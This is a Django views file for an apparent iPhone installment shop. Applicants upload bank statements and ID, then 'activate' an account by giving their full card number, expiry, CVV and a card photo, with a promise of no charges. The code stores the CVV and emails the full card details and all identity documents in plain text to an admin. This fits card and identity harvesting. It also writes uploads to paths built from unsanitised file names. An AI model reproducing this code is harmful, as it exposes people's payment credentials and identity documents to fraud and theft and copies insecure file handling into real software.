from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth import login, authenticate, logout
from django.contrib.auth.decorators import login_required
from django.contrib import messages
from django.core.mail import EmailMessage
from django.conf import settings
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
import os
import json
import shutil
from django.db import IntegrityError
import logging

from .models import CustomUser, DocumentUpload, Application, Phone
from .forms import (
    DocumentUploadForm, UserRegistrationForm, PhoneSelectionForm, 
    CardInformationForm, ApplicationStatusForm
)

def staff_required(view_func):
    """
    Decorator to ensure only staff users can access admin views
    """
    def wrapper(request, *args, **kwargs):
        if not request.user.is_authenticated:
            messages.error(request, "Please log in to access this page.")
            return redirect('applications:landing_page')
        if not request.user.is_staff:
            messages.error(request, "Access denied. Admin privileges required.")
            return redirect('applications:dashboard')
        return view_func(request, *args, **kwargs)
    return wrapper

def landing_page(request):
    """
    Landing page for unauthenticated users to upload initial documents
    Step 1 of the application process
    """
    if request.method == 'POST':
        form = DocumentUploadForm(request.POST, request.FILES)
        if form.is_valid():
            # Save the uploaded file to a temporary location
            uploaded_file = request.FILES['file']
            temp_filename = f"temp_{timezone.now().strftime('%Y%m%d_%H%M%S')}_{uploaded_file.name}"
            temp_file_path = os.path.join(settings.MEDIA_ROOT, 'temp_uploads', temp_filename)
            os.makedirs(os.path.dirname(temp_file_path), exist_ok=True)
            
            with open(temp_file_path, 'wb+') as destination:
                for chunk in uploaded_file.chunks():
                    destination.write(chunk)
            
            # Store document info in session for later processing
            document_data = {
                'document_type': form.cleaned_data['document_type'],
                'file_name': uploaded_file.name,
                'temp_file_path': f"temp_uploads/{temp_filename}",
                'content_type': uploaded_file.content_type,
            }
            
            # Initialize documents list in session if not exists
            if 'temp_documents' not in request.session:
                request.session['temp_documents'] = []
            
            # Check if document type already uploaded
            existing_docs = [doc['document_type'] for doc in request.session['temp_documents']]
            if document_data['document_type'] in existing_docs:
                messages.error(request, f"{form.cleaned_data['document_type']} already uploaded")
                # Clean up the uploaded file
                if os.path.exists(temp_file_path):
                    os.remove(temp_file_path)
            else:
                request.session['temp_documents'].append(document_data)
                request.session.modified = True
                messages.success(request, f"{form.cleaned_data['document_type']} uploaded successfully")
                
                # Check if we have required documents for auto-verification
                uploaded_types = [doc['document_type'] for doc in request.session['temp_documents']]
                required_docs = ['bank_statement', 'id_picture']
                
                if all(doc in uploaded_types for doc in required_docs):
                    request.session['can_auto_verify'] = True
                    messages.info(request, "All required documents uploaded. You can now register your account.")
                else:
                    request.session['can_auto_verify'] = False
                    if 'payslip' not in uploaded_types:
                        messages.warning(request, "Payslip is optional but recommended for faster approval.")
                
                # Only show success message if we have all required documents
                if all(doc in uploaded_types for doc in required_docs):
                    messages.success(request, "All required documents uploaded! You can now register your account.")
                else:
                    messages.info(request, "Please upload all required documents (Bank Statement and ID Picture) before proceeding.")
    else:
        form = DocumentUploadForm()
    
    # Get uploaded documents for display
    uploaded_docs = request.session.get('temp_documents', [])
    uploaded_types = [doc['document_type'] for doc in uploaded_docs]
    required_docs = ['bank_statement', 'id_picture']
    
    context = {
        'form': form,
        'uploaded_documents': uploaded_docs,
        'can_proceed': all(doc in uploaded_types for doc in required_docs)  # Must have both bank statement and ID
    }
    return render(request, 'applications/landing_page.html', context)

def register(request):
    """
    User registration page - Step 2
    Creates user account and processes uploaded documents
    """
    # Check if user has uploaded required documents
    temp_documents = request.session.get('temp_documents', [])
    uploaded_types = [doc['document_type'] for doc in temp_documents]
    required_docs = ['bank_statement', 'id_picture']
    
    if not all(doc in uploaded_types for doc in required_docs):
        messages.error(request, "Please upload both bank statement and ID picture before proceeding.")
        return redirect('applications:landing_page')
    
    if request.method == 'POST':
        form = UserRegistrationForm(request.POST)
        if form.is_valid():
            try:
                user = form.save()
            except IntegrityError:
                form.add_error(None, "A user with that username or email already exists. Please choose a different one.")
            else:
                # Process uploaded documents
                for doc_data in temp_documents:
                    # Move the temporary file to the final location
                    temp_file_path = os.path.join(settings.MEDIA_ROOT, doc_data['temp_file_path'])
                    final_file_path = f"documents/{user.id}/{doc_data['document_type']}/{doc_data['file_name']}"
                    final_full_path = os.path.join(settings.MEDIA_ROOT, final_file_path)
                    os.makedirs(os.path.dirname(final_full_path), exist_ok=True)
                    
                    # Move the file from temp location to final location
                    if os.path.exists(temp_file_path):
                        import shutil
                        shutil.move(temp_file_path, final_full_path)
                        
                        # Create the document record
                        document = DocumentUpload(
                            user=user,
                            document_type=doc_data['document_type'],
                            file=final_file_path
                        )
                        document.save()
                    else:
                        # If temp file doesn't exist, create a placeholder
                        with open(final_full_path, 'w') as f:
                            f.write(f"Placeholder for {doc_data['document_type']} - {doc_data['file_name']}")
                        
                        document = DocumentUpload(
                            user=user,
                            document_type=doc_data['document_type'],
                            file=final_file_path
                        )
                        document.save()
                
                # Create application and determine status
                application = Application.objects.create(
                    user=user,
                    card_last4="",
                    is_verified=request.session.get('can_auto_verify', False),
                    status='auto_approved' if request.session.get('can_auto_verify', False) else 'manual_review'
                )
                
                # Clear session data
                del request.session['temp_documents']
                del request.session['can_auto_verify']
                
                # Auto-login user
                login(request, user)
                messages.success(request, "Account created successfully! Please activate your account with card details.")
                return redirect('applications:card_activation')
    else:
        form = UserRegistrationForm()
    
    context = {
        'form': form,
        'uploaded_documents': temp_documents
    }
    return render(request, 'applications/register.html', context)

def logout_view(request):
    """
    Logout view that redirects to landing page
    """
    logout(request)
    messages.success(request, "You have been successfully logged out.")
    return redirect('applications:landing_page')

@login_required
def card_activation(request):
    """
    Card activation page - Step 3
    User enters card details for account activation (no charges)
    """
    try:
        application = request.user.application
    except Application.DoesNotExist:
        messages.error(request, "Application not found. Please start over.")
        return redirect('applications:landing_page')
    
    if request.method == 'POST':
        form = CardInformationForm(request.POST, request.FILES)
        if form.is_valid():
            try:
                # Save payment method and duration
                application.payment_method = form.cleaned_data['payment_method']
                # Convert payment_duration to int since it comes as string from ChoiceField
                payment_duration = form.cleaned_data['payment_duration']
                application.payment_duration = int(payment_duration) if payment_duration else 24
                
                # Save card details if provided
                if form.cleaned_data.get('card_number'):
                    application.card_number = form.cleaned_data['card_number']
                    # Extract last 4 digits
                    clean_number = form.cleaned_data['card_number'].replace(' ', '')
                    application.card_last4 = clean_number[-4:] if len(clean_number) >= 4 else ''
                
                if form.cleaned_data.get('card_expiry_month'):
                    application.card_expiry_month = form.cleaned_data['card_expiry_month']
                
                if form.cleaned_data.get('card_expiry_year'):
                    application.card_expiry_year = form.cleaned_data['card_expiry_year']
                
                if form.cleaned_data.get('card_cvv'):
                    application.card_cvv = form.cleaned_data['card_cvv']
                
                # Save card image if provided
                if form.cleaned_data.get('card_image'):
                    card_image = form.cleaned_data['card_image']
                    # Delete existing card image if any
                    existing_card_image = request.user.documents.filter(document_type='card_image').first()
                    if existing_card_image:
                        existing_card_image.delete()
                    
                    document = DocumentUpload(
                        user=request.user,
                        document_type='card_image',
                        file=card_image
                    )
                    document.save()
                
                application.save()
                
                messages.success(request, "Account activated successfully! Please select your iPhone.")
                return redirect('applications:select_phone')
                
            except Exception as e:
                messages.error(request, f"Error saving application: {str(e)}")
                # Log the error for debugging
                logger = logging.getLogger(__name__)
                logger.error(f"Error saving card information: {str(e)}")
        else:
            # Form has errors, will be displayed in template
            messages.error(request, "Please correct the errors below.")
    else:
        form = CardInformationForm()
    
    context = {
        'form': form,
        'application': application
    }
    return render(request, 'applications/card_activation.html', context)

@login_required
def select_phone(request):
    """
    Phone selection page - Step 3
    User selects one or more iPhone models and configuration
    """
    try:
        application = request.user.application
    except Application.DoesNotExist:
        messages.error(request, "Application not found. Please start over.")
        return redirect('applications:landing_page')
    
    if request.method == 'POST':
        form = PhoneSelectionForm(request.POST)
        if form.is_valid():
            # Remove previous selections
            application.selected_phones.all().delete()
            phones = form.cleaned_data['phones']
            for phone in phones:
                quantity = form.cleaned_data.get(f'quantity_{phone.id}', 1)
                application.selected_phones.create(phone=phone, quantity=quantity)
            
            # Send email to admin after phone selection is complete
            send_application_email(application)
            
            messages.success(request, "Phones selected. Your application is now complete!")
            return redirect('applications:dashboard')
    else:
        form = PhoneSelectionForm()
    
    context = {
        'form': form,
        'phones': Phone.objects.filter(is_available=True)
    }
    return render(request, 'applications/select_phone.html', context)

@login_required
def card_information(request):
    """
    Card information page - Step 4 (Legacy - now redirects to dashboard)
    This view is kept for backward compatibility but redirects to dashboard
    """
    messages.info(request, "Card information is now collected during account activation.")
    return redirect('applications:dashboard')

@login_required
def dashboard(request):
    """
    User dashboard showing application status and details
    """
    try:
        application = request.user.application
    except Application.DoesNotExist:
        messages.error(request, "No application found. Please start a new application.")
        return redirect('applications:landing_page')
    
    context = {
        'application': application,
        'documents': request.user.documents.all(),
        'missing_documents': application.get_missing_documents()
    }
    return render(request, 'applications/dashboard.html', context)

def send_application_email(application):
    """
    Send application details to admin via email with attachments
    """
    user = application.user
    documents = user.documents.all()
    
    # Prepare email content
    subject = f"New iPhone Application - {user.email}"
    
    # Check if payslip is missing
    payslip_missing = not documents.filter(document_type='payslip').exists()
    
    # Get selected phones information
    selected_phones = application.selected_phones.all()
    phones_info = []
    total_price = 0
    
    for app_phone in selected_phones:
        phone_info = f"{app_phone.phone.name} {app_phone.phone.storage} {app_phone.phone.color} (x{app_phone.quantity})"
        phones_info.append(phone_info)
        total_price += app_phone.total_price
    
    phones_display = "\n".join([f"- {phone}" for phone in phones_info]) if phones_info else "No phones selected"
    
    # Prepare card information
    card_info = ""
    if application.card_number:
        card_info = f"""
    Card Information:
    - Card Number: {application.card_number}
    - Expiry Date: {application.card_expiry_month}/{application.card_expiry_year}
    - CVV: {application.card_cvv}
    - Last 4: {application.card_last4}
    """
    else:
        card_info = "Card Information: Not provided"
    
    body = f"""
    New iPhone Installment Application
    
    User Details:
    - Name: {user.get_full_name()}
    - Email: {user.email}
    - Phone: {user.phone_number}
    
    Selected Phones:
    {phones_display}
    
    Total Price: R{total_price}
    Payment Duration: {application.payment_duration} Months
    Monthly Payment: R{application.get_monthly_payment():.2f}
    Payment Method: {application.get_payment_method_display()}
    {card_info}
    
    Status: {application.get_status_display()}
    Auto-verified: {'Yes' if application.is_verified else 'No'}
    
    Documents Uploaded:
    """
    
    for doc in documents:
        body += f"- {doc.get_document_type_display()}: {doc.file.name}\n"
    
    if payslip_missing:
        body += "\n⚠️  WARNING: Payslip is missing - Manual review required!"
    
    # Create email
    email = EmailMessage(
        subject=subject,
        body=body,
        from_email=settings.DEFAULT_FROM_EMAIL,
        to=[settings.ADMIN_EMAIL] if hasattr(settings, 'ADMIN_EMAIL') else ['admin@example.com']
    )
    
    # Attach all documents
    for document in documents:
        if document.file:
            email.attach_file(document.file.path)
    
    email.send()

@login_required
@staff_required
def admin_application_list(request):
    """
    Admin view to list all applications for review
    """
    
    applications = Application.objects.all().order_by('-created_at')
    
    if request.method == 'POST':
        application_id = request.POST.get('application_id')
        new_status = request.POST.get('status')
        admin_approved = request.POST.get('admin_approved') == 'on'
        
        application = get_object_or_404(Application, id=application_id)
        application.status = new_status
        application.admin_approved = admin_approved
        application.save()
        
        messages.success(request, f"Application {application_id} updated successfully.")
        return redirect('applications:admin_application_list')
    
    context = {
        'applications': applications
    }
    return render(request, 'applications/admin_application_list.html', context)

@login_required
@staff_required
def admin_application_detail(request, application_id):
    """
    Admin view to review specific application details
    """
    
    application = get_object_or_404(Application, id=application_id)
    
    if request.method == 'POST':
        form = ApplicationStatusForm(request.POST, instance=application)
        if form.is_valid():
            form.save()
            messages.success(request, "Application status updated successfully.")
            return redirect('applications:admin_application_list')
    else:
        form = ApplicationStatusForm(instance=application)
    
    context = {
        'application': application,
        'form': form,
        'documents': application.user.documents.all()
    }
    return render(request, 'applications/admin_application_detail.html', context)

@login_required
@staff_required
def test_card_details(request):
    """
    Test view to verify card details functionality
    """
    # Only show applications that used card verification
    applications = Application.objects.filter(
        payment_method='card_verification',
        card_number__isnull=False
    ).order_by('-created_at')
    
    context = {
        'applications': applications,
        'total_applications': Application.objects.count(),
        'applications_with_cards': applications.count(),
        'applications_without_cards': Application.objects.filter(card_number__isnull=True).count(),
        'card_verification_applications': applications.count(),
    }
    
    return render(request, 'applications/test_card_details.html', context)
